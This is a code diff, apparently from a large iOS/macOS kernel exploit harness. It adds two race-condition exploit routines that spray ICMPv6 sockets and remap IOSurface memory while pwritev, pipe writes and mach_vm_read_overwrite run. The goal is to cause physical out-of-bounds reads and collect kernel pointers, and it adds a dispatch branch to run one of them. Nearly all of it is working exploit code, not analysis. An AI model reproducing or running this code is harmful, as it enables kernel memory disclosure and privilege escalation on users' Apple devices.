@@ -17286,6 +17286,639 @@ static void r460_exploit(void) {
     #undef R460_ICMP_SPRAY
 }
 
+/* r470: Corrected ClearSword-style TOCTOU
+ *
+ * Based on research findings:
+ * - 2-page PurpleGfxMem IOSurface (MUST set IOSurfaceMemoryRegion)
+ * - iov_base = surf_base + 0x3f00, iov_len = 0x1000, file offset = 0x3f00
+ * - Single remap per attempt (not oscillation)
+ * - Detection: errno == EINVAL after pwritev
+ * - Search mapping: 128 MiB anonymous (inherently non-contiguous phys pages)
+ * - F_NOCACHE required
+ *
+ * Race: cluster_io_type → IO_CONTIG → remap → cluster_write_contig → UPL from remap
+ * cluster_align_phys_io loop:
+ *   iter1: 0x100 bytes at offset 0x3f00 (within first page, OK)
+ *   iter2: 0xf00 bytes at offset 0x4000 (phys_page_0 + 0x4000 → OOB!)
+ */
+
+struct r470_shared {
+    _Atomic int race_sync;
+    _Atomic int stop;
+    mach_vm_address_t target;
+    mach_vm_size_t target_size;
+    mach_port_t remap_entry;
+};
+
+static void *r470_free_thread(void *arg) {
+    struct r470_shared *s = (struct r470_shared *)arg;
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+    mach_port_t self = mach_task_self();
+    while (!atomic_load_explicit(&s->stop, __ATOMIC_SEQ_CST)) {
+        while (atomic_load_explicit(&s->race_sync, __ATOMIC_SEQ_CST) != 1) {
+            if (atomic_load_explicit(&s->stop, __ATOMIC_SEQ_CST)) return NULL;
+            __asm__ volatile("yield");
+        }
+        mach_vm_address_t t = s->target;
+        mach_vm_map(self, &t, s->target_size, 0,
+            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+            s->remap_entry, 0, FALSE,
+            VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
+            VM_INHERIT_NONE);
+        atomic_store_explicit(&s->race_sync, 0, __ATOMIC_SEQ_CST);
+    }
+    return NULL;
+}
+
+static void r470_exploit(void) {
+    rlog("\n=== r470: ClearSword-style TOCTOU ===\n\n");
+    fflush(stdout);
+
+    #define R470_PAGE_SZ 16384
+    #define R470_SURF_PAGES 2
+    #define R470_SURF_SZ (R470_SURF_PAGES * R470_PAGE_SZ)
+    #define R470_SEARCH_SZ (128ULL * 1024 * 1024)
+    #define R470_ITERS_PER_PAGE 50
+    #define R470_IOV_OFFSET 0x3f00
+    #define R470_IOV_LEN 0x1000
+
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+
+    /* Phase 0: F_NOCACHE output file */
+    rlog("  --- Phase 0: Output file (F_NOCACHE) ---\n"); fflush(stdout);
+    char tmppath[256];
+    const char *tmpdir = getenv("TMPDIR");
+    int fd = -1;
+    if (tmpdir) {
+        snprintf(tmppath, sizeof(tmppath), "%s/r470_oob", tmpdir);
+        fd = open(tmppath, O_RDWR | O_CREAT | O_TRUNC, 0600);
+    }
+    if (fd < 0) {
+        snprintf(tmppath, sizeof(tmppath), "/private/var/tmp/r470_oob_%d", getpid());
+        fd = open(tmppath, O_RDWR | O_CREAT | O_TRUNC, 0600);
+    }
+    if (fd < 0) { rlog("    FAILED\n"); rlog("\n=== r470 done ===\n"); return; }
+    fcntl(fd, F_NOCACHE, 1);
+    char *zbuf = (char *)calloc(1, R470_SURF_SZ);
+    pwrite(fd, zbuf, R470_SURF_SZ, 0);
+    free(zbuf);
+    rlog("    fd=%d\n", fd);
+
+    /* Phase 1: ICMPv6 spray */
+    rlog("  --- Phase 1: ICMPv6 spray ---\n"); fflush(stdout);
+    int icmp_fds[2000]; int icmp_count = 0;
+    for (int i = 0; i < 2000; i++) {
+        icmp_fds[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
+        if (icmp_fds[i] < 0) break;
+        struct icmp6_filter filt;
+        ICMP6_FILTER_SETBLOCKALL(&filt);
+        ICMP6_FILTER_SETPASS(i & 0xFF, &filt);
+        setsockopt(icmp_fds[i], IPPROTO_ICMPV6, ICMP6_FILTER, &filt, sizeof(filt));
+        icmp_count++;
+    }
+    rlog("    %d sockets\n", icmp_count);
+
+    /* Phase 2: PurpleGfxMem IOSurface (2 pages) */
+    rlog("\n  --- Phase 2: PurpleGfxMem IOSurface (2 pages = %dKB) ---\n",
+         R470_SURF_SZ / 1024);
+    fflush(stdout);
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int pw = R470_SURF_SZ, ph = 1, pbpe = 1, ppf = 0x4C303038;
+    CFNumberRef pwn = CFNumberCreate(NULL, kCFNumberIntType, &pw);
+    CFNumberRef phn = CFNumberCreate(NULL, kCFNumberIntType, &ph);
+    CFNumberRef pbn = CFNumberCreate(NULL, kCFNumberIntType, &pbpe);
+    CFNumberRef ppn = CFNumberCreate(NULL, kCFNumberIntType, &ppf);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), pwn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), phn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), pbn);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), ppn);
+    int alloc_sz_v = R470_SURF_SZ;
+    CFNumberRef an = CFNumberCreate(NULL, kCFNumberIntType, &alloc_sz_v);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), an);
+    /* CRITICAL: Set PurpleGfxMem memory region for PHYS_CONTIG */
+    CFDictionarySetValue(props, CFSTR("IOSurfaceMemoryRegion"),
+                         CFSTR("PurpleGfxMem"));
+    IOSurfaceRef surf = IOSurfaceCreate(props);
+    CFRelease(props); CFRelease(pwn); CFRelease(phn); CFRelease(pbn); CFRelease(ppn); CFRelease(an);
+    if (!surf) {
+        rlog("    IOSurface create FAILED\n");
+        for (int i = 0; i < icmp_count; i++) close(icmp_fds[i]);
+        close(fd); unlink(tmppath); rlog("\n=== r470 done ===\n"); return;
+    }
+    IOSurfaceLock(surf, 0, NULL);
+    void *surf_base = IOSurfaceGetBaseAddress(surf);
+    memset(surf_base, 0xAA, R470_SURF_SZ);
+    memory_object_size_t surf_memsz = R470_SURF_SZ;
+    mach_port_t surf_entry = MACH_PORT_NULL;
+    kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &surf_memsz,
+        (mach_vm_address_t)(uintptr_t)surf_base,
+        VM_PROT_READ | VM_PROT_WRITE, &surf_entry, MACH_PORT_NULL);
+    IOSurfaceUnlock(surf, 0, NULL);
+    rlog("    base=%p sz=%d entry=0x%x\n", surf_base, R470_SURF_SZ, surf_entry);
+    if (kr != KERN_SUCCESS || surf_entry == MACH_PORT_NULL) {
+        rlog("    mem_entry FAILED kr=0x%x\n", kr);
+        for (int i = 0; i < icmp_count; i++) close(icmp_fds[i]);
+        close(fd); unlink(tmppath); CFRelease(surf);
+        rlog("\n=== r470 done ===\n"); return;
+    }
+
+    /* Phase 3: Search mapping (128 MiB, random addr) */
+    rlog("\n  --- Phase 3: Search mapping (%llu MiB) ---\n",
+         (unsigned long long)(R470_SEARCH_SZ / (1024 * 1024)));
+    fflush(stdout);
+    mach_vm_address_t search_base = 0;
+    kr = mach_vm_allocate(mach_task_self(), &search_base, R470_SEARCH_SZ,
+        VM_FLAGS_ANYWHERE);
+    if (kr != KERN_SUCCESS) {
+        rlog("    alloc FAILED kr=0x%x\n", kr);
+        mach_port_deallocate(mach_task_self(), surf_entry);
+        for (int i = 0; i < icmp_count; i++) close(icmp_fds[i]);
+        close(fd); unlink(tmppath); CFRelease(surf);
+        rlog("\n=== r470 done ===\n"); return;
+    }
+    rlog("    base=0x%llx\n", (unsigned long long)search_base);
+
+    /* Fault every page with markers */
+    uint64_t search_pages = R470_SEARCH_SZ / R470_PAGE_SZ;
+    rlog("    Faulting %llu pages...\n", (unsigned long long)search_pages);
+    for (uint64_t p = 0; p < search_pages; p++) {
+        uint8_t *pg = (uint8_t *)(uintptr_t)(search_base + p * R470_PAGE_SZ);
+        pg[0] = 0xDE;
+        pg[1] = (uint8_t)(p & 0xFF);
+        pg[2] = (uint8_t)((p >> 8) & 0xFF);
+    }
+    rlog("    Done faulting\n");
+
+    /* Phase 4: Race loop */
+    rlog("\n  --- Phase 4: TOCTOU race ---\n");
+    rlog("    iov_base=surf+0x%x iov_len=0x%x file_off=0x%x\n",
+         R470_IOV_OFFSET, R470_IOV_LEN, R470_IOV_OFFSET);
+    rlog("    %d iters per search page, %llu search pages\n",
+         R470_ITERS_PER_PAGE, (unsigned long long)search_pages);
+    rlog("    Race win: errno=EINVAL after pwritev\n");
+    fflush(stdout);
+
+    struct r470_shared shared;
+    memset(&shared, 0, sizeof(shared));
+    shared.target = (mach_vm_address_t)(uintptr_t)surf_base;
+    shared.target_size = R470_SURF_SZ;
+    shared.remap_entry = MACH_PORT_NULL;
+
+    pthread_t free_tid;
+    pthread_create(&free_tid, NULL, r470_free_thread, &shared);
+
+    int total_races = 0, race_wins = 0, oob_reads = 0;
+    uint8_t oob_buf[R470_PAGE_SZ];
+    int found_kptr = 0;
+
+    for (uint64_t sp = 0; sp < search_pages && !found_kptr; sp++) {
+        mach_vm_address_t sp_addr = search_base + sp * R470_PAGE_SZ;
+
+        /* Create memory entry for this search page pair (2 pages) */
+        if (sp + 1 >= search_pages) break;
+        memory_object_size_t sp_memsz = R470_SURF_SZ;
+        mach_port_t sp_entry = MACH_PORT_NULL;
+        kr = mach_make_memory_entry_64(mach_task_self(), &sp_memsz,
+            sp_addr, VM_PROT_READ | VM_PROT_WRITE, &sp_entry, MACH_PORT_NULL);
+        if (kr != KERN_SUCCESS || sp_memsz != R470_SURF_SZ) continue;
+
+        shared.remap_entry = sp_entry;
+
+        for (int iter = 0; iter < R470_ITERS_PER_PAGE; iter++) {
+            /* Restore IOSurface mapping */
+            mach_vm_address_t t = (mach_vm_address_t)(uintptr_t)surf_base;
+            mach_vm_map(mach_task_self(), &t, R470_SURF_SZ, 0,
+                VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+                surf_entry, 0, FALSE,
+                VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
+                VM_INHERIT_NONE);
+
+            /* Signal free thread to do remap */
+            atomic_store_explicit(&shared.race_sync, 1, __ATOMIC_SEQ_CST);
+
+            /* pwritev with misaligned iov */
+            struct iovec wv = {
+                (void *)((uintptr_t)surf_base + R470_IOV_OFFSET),
+                R470_IOV_LEN
+            };
+            errno = 0;
+            ssize_t w = pwritev(fd, &wv, 1, R470_IOV_OFFSET);
+            int save_errno = errno;
+            total_races++;
+
+            /* Wait for free thread to complete */
+            while (atomic_load_explicit(&shared.race_sync, __ATOMIC_SEQ_CST) != 0)
+                __asm__ volatile("yield");
+
+            if (w == -1 && save_errno == EINVAL) {
+                race_wins++;
+                /* Read back file data to check for OOB content */
+                pread(fd, oob_buf, R470_PAGE_SZ, R470_IOV_OFFSET);
+                /* Check for kernel pointers in OOB region */
+                int kptrs = 0;
+                for (int j = 0x100; j < R470_IOV_LEN - 7; j += 8) {
+                    uint64_t val = *(uint64_t *)(oob_buf + j);
+                    if ((val & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
+                        kptrs++;
+                        if (kptrs <= 5)
+                            rlog("    [sp=%llu iter=%d] KPTR +0x%x: 0x%016llx\n",
+                                 (unsigned long long)sp, iter, j,
+                                 (unsigned long long)val);
+                    }
+                }
+                if (kptrs > 0) {
+                    rlog("    *** OOB with %d kernel ptrs at search page %llu ***\n",
+                         kptrs, (unsigned long long)sp);
+                    oob_reads++;
+                    found_kptr = 1;
+                    break;
+                }
+                if (race_wins <= 5 || race_wins % 100 == 0)
+                    rlog("    Race win #%d at sp=%llu (no kptrs yet)\n",
+                         race_wins, (unsigned long long)sp);
+            }
+        }
+
+        mach_port_deallocate(mach_task_self(), sp_entry);
+
+        if ((sp + 1) % 1000 == 0)
+            rlog("    ... sp=%llu/%llu  races=%d wins=%d oob=%d\n",
+                 (unsigned long long)(sp + 1), (unsigned long long)search_pages,
+                 total_races, race_wins, oob_reads);
+    }
+
+    atomic_store_explicit(&shared.stop, 1, __ATOMIC_SEQ_CST);
+    atomic_store_explicit(&shared.race_sync, 1, __ATOMIC_SEQ_CST);
+    pthread_join(free_tid, NULL);
+
+    rlog("\n    TOTAL: races=%d wins=%d oob_kptr=%d\n",
+         total_races, race_wins, oob_reads);
+
+    /* Cleanup */
+    mach_vm_deallocate(mach_task_self(), search_base, R470_SEARCH_SZ);
+    mach_port_deallocate(mach_task_self(), surf_entry);
+    for (int i = 0; i < icmp_count; i++) close(icmp_fds[i]);
+    close(fd); unlink(tmppath);
+    CFRelease(surf);
+
+    rlog("\n=== r470 done ===\n");
+
+    #undef R470_PAGE_SZ
+    #undef R470_SURF_PAGES
+    #undef R470_SURF_SZ
+    #undef R470_SEARCH_SZ
+    #undef R470_ITERS_PER_PAGE
+    #undef R470_IOV_OFFSET
+    #undef R470_IOV_LEN
+}
+
+/* r469: TOCTOU via pipe write — copyin from IOSurface while remapping
+ *
+ * Theory: pipe write goes through copyin() which may use bcopy_phys
+ * for PHYS_CONTIG memory. If mapping changes during copyin, kernel
+ * copies linearly from first physical page → OOB into adjacent phys mem.
+ *
+ * Also tests mach_vm_read_overwrite for the same race.
+ */
+struct r469_ctx {
+    volatile int go;
+    volatile int stop;
+    volatile int remap_count;
+    mach_vm_address_t target;
+    mach_vm_size_t size;
+    mach_port_t surf_entry;
+    mach_port_t cow_entry;
+};
+
+static void *r469_remap_thread(void *arg) {
+    struct r469_ctx *ctx = (struct r469_ctx *)arg;
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+    mach_port_t self = mach_task_self();
+    mach_vm_address_t tgt = ctx->target;
+    mach_vm_size_t sz = ctx->size;
+    mach_port_t se = ctx->surf_entry;
+    mach_port_t ce = ctx->cow_entry;
+    while (!ctx->go) { __asm__ volatile("yield"); }
+    while (!ctx->stop) {
+        mach_vm_address_t t = tgt;
+        mach_vm_map(self, &t, sz, 0,
+            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+            se, 0, FALSE,
+            VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
+        t = tgt;
+        kern_return_t kr = mach_vm_map(self, &t, sz, 0,
+            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+            ce, 0, FALSE,
+            VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
+        if (kr == KERN_SUCCESS) __sync_fetch_and_add(&ctx->remap_count, 1);
+    }
+    return NULL;
+}
+
+static void r469_exploit(void) {
+    rlog("\n=== r469: pipe + mach_vm_read TOCTOU ===\n\n");
+    fflush(stdout);
+
+    #define R469_PAGE_SZ 16384
+    #define R469_PAGES 3
+    #define R469_SZ (R469_PAGES * R469_PAGE_SZ)
+    #define R469_COW_PAGE 1
+    #define R469_THREADS 6
+    #define R469_ITERS 10000
+
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+
+    /* ICMPv6 spray */
+    rlog("  --- ICMPv6 spray ---\n"); fflush(stdout);
+    int icmp_fds[500]; int icmp_count = 0;
+    for (int i = 0; i < 500; i++) {
+        icmp_fds[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
+        if (icmp_fds[i] < 0) break;
+        struct icmp6_filter filt;
+        ICMP6_FILTER_SETBLOCKALL(&filt);
+        ICMP6_FILTER_SETPASS(i & 0xFF, &filt);
+        setsockopt(icmp_fds[i], IPPROTO_ICMPV6, ICMP6_FILTER, &filt, sizeof(filt));
+        icmp_count++;
+    }
+    rlog("    %d sockets\n", icmp_count);
+
+    /* IOSurface (3 pages, 0xAA) */
+    rlog("  --- IOSurface (%d pages) ---\n", R469_PAGES); fflush(stdout);
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int pw = R469_SZ, ph = 1, pbpe = 1, ppf = 0x4C303038;
+    CFNumberRef pwn = CFNumberCreate(NULL, kCFNumberIntType, &pw);
+    CFNumberRef phn = CFNumberCreate(NULL, kCFNumberIntType, &ph);
+    CFNumberRef pbn = CFNumberCreate(NULL, kCFNumberIntType, &pbpe);
+    CFNumberRef ppn = CFNumberCreate(NULL, kCFNumberIntType, &ppf);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), pwn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), phn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), pbn);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), ppn);
+    int alloc_sz_v = R469_SZ;
+    CFNumberRef an = CFNumberCreate(NULL, kCFNumberIntType, &alloc_sz_v);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), an);
+    IOSurfaceRef surf = IOSurfaceCreate(props);
+    CFRelease(props); CFRelease(pwn); CFRelease(phn); CFRelease(pbn); CFRelease(ppn); CFRelease(an);
+    if (!surf) { rlog("    FAILED\n"); goto r469_cleanup_icmp; }
+    IOSurfaceLock(surf, 0, NULL);
+    void *surf_base = IOSurfaceGetBaseAddress(surf);
+    memset(surf_base, 0xAA, R469_SZ);
+    memory_object_size_t surf_memsz = R469_SZ;
+    mach_port_t surf_entry = MACH_PORT_NULL;
+    mach_make_memory_entry_64(mach_task_self(), &surf_memsz,
+        (mach_vm_address_t)(uintptr_t)surf_base,
+        VM_PROT_READ | VM_PROT_WRITE, &surf_entry, MACH_PORT_NULL);
+    IOSurfaceUnlock(surf, 0, NULL);
+    rlog("    base=%p entry=0x%x\n", surf_base, surf_entry);
+
+    /* COW remap */
+    rlog("  --- COW remap (page %d → 0xEE) ---\n", R469_COW_PAGE); fflush(stdout);
+    mach_vm_address_t remap_orig = 0;
+    kern_return_t kr = mach_vm_allocate(mach_task_self(), &remap_orig, R469_SZ, VM_FLAGS_ANYWHERE);
+    if (kr) { rlog("    alloc FAILED\n"); goto r469_cleanup_surf; }
+    memset((void *)(uintptr_t)remap_orig, 0xBB, R469_PAGE_SZ);
+    memset((void *)(uintptr_t)(remap_orig + R469_PAGE_SZ), 0xCC, R469_PAGE_SZ);
+    memset((void *)(uintptr_t)(remap_orig + 2 * R469_PAGE_SZ), 0xDD, R469_PAGE_SZ);
+
+    mach_vm_address_t cow_addr = 0;
+    vm_prot_t cur_prot, max_prot;
+    kr = mach_vm_remap(mach_task_self(), &cow_addr, R469_SZ, 0,
+        VM_FLAGS_ANYWHERE, mach_task_self(), remap_orig,
+        TRUE, &cur_prot, &max_prot, VM_INHERIT_NONE);
+    if (kr) { rlog("    COW FAILED\n"); goto r469_cleanup_remap; }
+    memset((void *)(uintptr_t)(cow_addr + R469_COW_PAGE * R469_PAGE_SZ), 0xEE, R469_PAGE_SZ);
+    rlog("    cow: p0=%02x p1=%02x p2=%02x (expect BB/EE/DD)\n",
+         *(uint8_t *)(uintptr_t)cow_addr,
+         *(uint8_t *)(uintptr_t)(cow_addr + R469_PAGE_SZ),
+         *(uint8_t *)(uintptr_t)(cow_addr + 2 * R469_PAGE_SZ));
+    rlog("    orig p1=%02x (expect CC)\n",
+         *(uint8_t *)(uintptr_t)(remap_orig + R469_PAGE_SZ));
+
+    memory_object_size_t cow_memsz = R469_SZ;
+    mach_port_t cow_entry = MACH_PORT_NULL;
+    mach_make_memory_entry_64(mach_task_self(), &cow_memsz,
+        cow_addr, VM_PROT_READ | VM_PROT_WRITE, &cow_entry, MACH_PORT_NULL);
+    if (cow_memsz != R469_SZ) { rlog("    mem_entry FAILED\n"); goto r469_cleanup_cow; }
+    rlog("    cow_entry=0x%x\n", cow_entry);
+
+    /* Test A: Pipe TOCTOU */
+    rlog("\n  --- Test A: Pipe write TOCTOU (%d iters) ---\n", R469_ITERS); fflush(stdout);
+    rlog("    OOB: readback p1=0xCC (orig). Normal: p1=0xEE (COW). Surf: p0=0xAA\n");
+    {
+        int pipefd[2];
+        if (pipe(pipefd) < 0) { rlog("    pipe FAILED\n"); goto r469_test_b; }
+        /* Set pipe to non-blocking read, increase buffer */
+        fcntl(pipefd[0], F_SETFL, O_NONBLOCK);
+        int pipesz = R469_SZ * 2;
+        fcntl(pipefd[1], F_SETPIPE_SZ, pipesz);
+
+        struct r469_ctx ctxs[R469_THREADS];
+        pthread_t tids[R469_THREADS];
+        for (int t = 0; t < R469_THREADS; t++) {
+            memset(&ctxs[t], 0, sizeof(struct r469_ctx));
+            ctxs[t].target = (mach_vm_address_t)(uintptr_t)surf_base;
+            ctxs[t].size = R469_SZ;
+            ctxs[t].surf_entry = surf_entry;
+            ctxs[t].cow_entry = cow_entry;
+            pthread_create(&tids[t], NULL, r469_remap_thread, &ctxs[t]);
+        }
+
+        uint8_t *rb = (uint8_t *)malloc(R469_SZ);
+        int oob = 0, remap_vis = 0, surf_vis = 0, mixed = 0, pipe_err = 0;
+        for (int t = 0; t < R469_THREADS; t++) ctxs[t].go = 1;
+        __sync_synchronize();
+
+        for (int iter = 0; iter < R469_ITERS; iter++) {
+            ssize_t w = write(pipefd[1], surf_base, R469_SZ);
+            if (w != (ssize_t)R469_SZ) { pipe_err++; continue; }
+            ssize_t r = read(pipefd[0], rb, R469_SZ);
+            if (r != (ssize_t)R469_SZ) { pipe_err++; continue; }
+
+            uint8_t p0 = rb[0], p1 = rb[R469_PAGE_SZ];
+            if (p0 == 0xBB || p0 == 0xEE) {
+                if (p1 == 0xCC) {
+                    oob++;
+                    rlog("    [iter %d] *** PIPE OOB *** p0=%02x p1=%02x p2=%02x\n",
+                         iter, p0, p1, rb[2 * R469_PAGE_SZ]);
+                } else if (p1 == 0xEE) remap_vis++;
+                else mixed++;
+            } else if (p0 == 0xAA) surf_vis++;
+            else mixed++;
+
+            if ((iter + 1) % 2000 == 0)
+                rlog("    %d/%d remap=%d surf=%d oob=%d mixed=%d err=%d\n",
+                     iter + 1, R469_ITERS, remap_vis, surf_vis, oob, mixed, pipe_err);
+        }
+
+        for (int t = 0; t < R469_THREADS; t++) ctxs[t].stop = 1;
+        __sync_synchronize();
+        int total_osc = 0;
+        for (int t = 0; t < R469_THREADS; t++) {
+            pthread_join(tids[t], NULL);
+            total_osc += ctxs[t].remap_count;
+        }
+
+        rlog("    PIPE: remap=%d surf=%d oob=%d mixed=%d err=%d / %d  osc=%d\n",
+             remap_vis, surf_vis, oob, mixed, pipe_err, R469_ITERS, total_osc);
+        close(pipefd[0]); close(pipefd[1]);
+        free(rb);
+    }
+
+    /* Test B: mach_vm_read_overwrite TOCTOU */
+    r469_test_b:
+    rlog("\n  --- Test B: mach_vm_read_overwrite TOCTOU (%d iters) ---\n", R469_ITERS);
+    fflush(stdout);
+    {
+        uint8_t *dst = (uint8_t *)malloc(R469_SZ);
+        struct r469_ctx ctxs[R469_THREADS];
+        pthread_t tids[R469_THREADS];
+        for (int t = 0; t < R469_THREADS; t++) {
+            memset(&ctxs[t], 0, sizeof(struct r469_ctx));
+            ctxs[t].target = (mach_vm_address_t)(uintptr_t)surf_base;
+            ctxs[t].size = R469_SZ;
+            ctxs[t].surf_entry = surf_entry;
+            ctxs[t].cow_entry = cow_entry;
+            pthread_create(&tids[t], NULL, r469_remap_thread, &ctxs[t]);
+        }
+
+        int oob = 0, remap_vis = 0, surf_vis = 0, mixed = 0, vm_err = 0;
+        for (int t = 0; t < R469_THREADS; t++) ctxs[t].go = 1;
+        __sync_synchronize();
+
+        for (int iter = 0; iter < R469_ITERS; iter++) {
+            mach_vm_size_t out_size = R469_SZ;
+            kern_return_t kr2 = mach_vm_read_overwrite(mach_task_self(),
+                (mach_vm_address_t)(uintptr_t)surf_base, R469_SZ,
+                (mach_vm_address_t)(uintptr_t)dst, &out_size);
+            if (kr2 || out_size != R469_SZ) { vm_err++; continue; }
+
+            uint8_t p0 = dst[0], p1 = dst[R469_PAGE_SZ];
+            if (p0 == 0xBB || p0 == 0xEE) {
+                if (p1 == 0xCC) {
+                    oob++;
+                    rlog("    [iter %d] *** VM_READ OOB *** p0=%02x p1=%02x p2=%02x\n",
+                         iter, p0, p1, dst[2 * R469_PAGE_SZ]);
+                } else if (p1 == 0xEE) remap_vis++;
+                else mixed++;
+            } else if (p0 == 0xAA) surf_vis++;
+            else mixed++;
+
+            if ((iter + 1) % 2000 == 0)
+                rlog("    %d/%d remap=%d surf=%d oob=%d mixed=%d err=%d\n",
+                     iter + 1, R469_ITERS, remap_vis, surf_vis, oob, mixed, vm_err);
+        }
+
+        for (int t = 0; t < R469_THREADS; t++) ctxs[t].stop = 1;
+        __sync_synchronize();
+        int total_osc = 0;
+        for (int t = 0; t < R469_THREADS; t++) {
+            pthread_join(tids[t], NULL);
+            total_osc += ctxs[t].remap_count;
+        }
+
+        rlog("    VM_READ: remap=%d surf=%d oob=%d mixed=%d err=%d / %d  osc=%d\n",
+             remap_vis, surf_vis, oob, mixed, vm_err, R469_ITERS, total_osc);
+        free(dst);
+    }
+
+    /* Test C: pwritev with F_NOCACHE + non-page-aligned file offset */
+    rlog("\n  --- Test C: pwritev offset=0x100 F_NOCACHE (%d iters) ---\n", R469_ITERS);
+    fflush(stdout);
+    {
+        char tmppath[256];
+        const char *tmpdir = getenv("TMPDIR");
+        int tfd = -1;
+        if (tmpdir) {
+            snprintf(tmppath, sizeof(tmppath), "%s/r469_oob", tmpdir);
+            tfd = open(tmppath, O_RDWR | O_CREAT | O_TRUNC, 0600);
+        }
+        if (tfd < 0) {
+            snprintf(tmppath, sizeof(tmppath), "/private/var/tmp/r469_oob_%d", getpid());
+            tfd = open(tmppath, O_RDWR | O_CREAT | O_TRUNC, 0600);
+        }
+        if (tfd < 0) { rlog("    open FAILED\n"); goto r469_cleanup_entries; }
+        fcntl(tfd, F_NOCACHE, 1);
+        char *zb = (char *)calloc(1, R469_SZ + 0x4000);
+        pwrite(tfd, zb, R469_SZ + 0x4000, 0);
+        free(zb);
+
+        struct r469_ctx ctxs[R469_THREADS];
+        pthread_t tids[R469_THREADS];
+        for (int t = 0; t < R469_THREADS; t++) {
+            memset(&ctxs[t], 0, sizeof(struct r469_ctx));
+            ctxs[t].target = (mach_vm_address_t)(uintptr_t)surf_base;
+            ctxs[t].size = R469_SZ;
+            ctxs[t].surf_entry = surf_entry;
+            ctxs[t].cow_entry = cow_entry;
+            pthread_create(&tids[t], NULL, r469_remap_thread, &ctxs[t]);
+        }
+
+        uint8_t *rb = (uint8_t *)malloc(R469_SZ + 0x4000);
+        int oob = 0, remap_vis = 0, surf_vis = 0, mixed = 0;
+        for (int t = 0; t < R469_THREADS; t++) ctxs[t].go = 1;
+        __sync_synchronize();
+
+        for (int iter = 0; iter < R469_ITERS; iter++) {
+            struct iovec wv = { surf_base, R469_SZ };
+            ssize_t written = pwritev(tfd, &wv, 1, 0x100);
+            if (written != (ssize_t)R469_SZ) continue;
+
+            pread(tfd, rb, R469_SZ, 0x100);
+            uint8_t p0 = rb[0], p1 = rb[R469_PAGE_SZ];
+            if (p0 == 0xBB || p0 == 0xEE) {
+                if (p1 == 0xCC) {
+                    oob++;
+                    rlog("    [iter %d] *** OFFSET OOB *** p0=%02x p1=%02x p2=%02x\n",
+                         iter, p0, p1, rb[2 * R469_PAGE_SZ]);
+                } else if (p1 == 0xEE) remap_vis++;
+                else mixed++;
+            } else if (p0 == 0xAA) surf_vis++;
+            else mixed++;
+
+            if ((iter + 1) % 2000 == 0)
+                rlog("    %d/%d remap=%d surf=%d oob=%d mixed=%d\n",
+                     iter + 1, R469_ITERS, remap_vis, surf_vis, oob, mixed);
+        }
+
+        for (int t = 0; t < R469_THREADS; t++) ctxs[t].stop = 1;
+        __sync_synchronize();
+        int total_osc = 0;
+        for (int t = 0; t < R469_THREADS; t++) {
+            pthread_join(tids[t], NULL);
+            total_osc += ctxs[t].remap_count;
+        }
+
+        rlog("    OFFSET: remap=%d surf=%d oob=%d mixed=%d / %d  osc=%d\n",
+             remap_vis, surf_vis, oob, mixed, R469_ITERS, total_osc);
+        free(rb);
+        close(tfd); unlink(tmppath);
+    }
+
+    /* Cleanup */
+    r469_cleanup_entries:
+    mach_port_deallocate(mach_task_self(), cow_entry);
+    r469_cleanup_cow:
+    mach_vm_deallocate(mach_task_self(), cow_addr, R469_SZ);
+    r469_cleanup_remap:
+    mach_vm_deallocate(mach_task_self(), remap_orig, R469_SZ);
+    r469_cleanup_surf:
+    mach_port_deallocate(mach_task_self(), surf_entry);
+    CFRelease(surf);
+    r469_cleanup_icmp:
+    for (int i = 0; i < icmp_count; i++) close(icmp_fds[i]);
+
+    rlog("\n=== r469 done ===\n");
+
+    #undef R469_PAGE_SZ
+    #undef R469_PAGES
+    #undef R469_SZ
+    #undef R469_COW_PAGE
+    #undef R469_THREADS
+    #undef R469_ITERS
+}
+
 /* r468: Physical OOB — F_NOCACHE + 16-page IOSurface + COW + oscillation
  *
  * Key changes from r466/r467:
@@ -86586,6 +87219,12 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 473) {
+            rlog("*** rounds=473: ClearSword-style TOCTOU ***\n\n");
+            fflush(stdout);
+            r470_exploit();
+            goto done;
+        }
         if (rounds == 472) {
             rlog("*** rounds=472: 16-page IOSurface + COW + F_NOCACHE ***\n\n");
             fflush(stdout);
@@ -89439,7 +90078,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
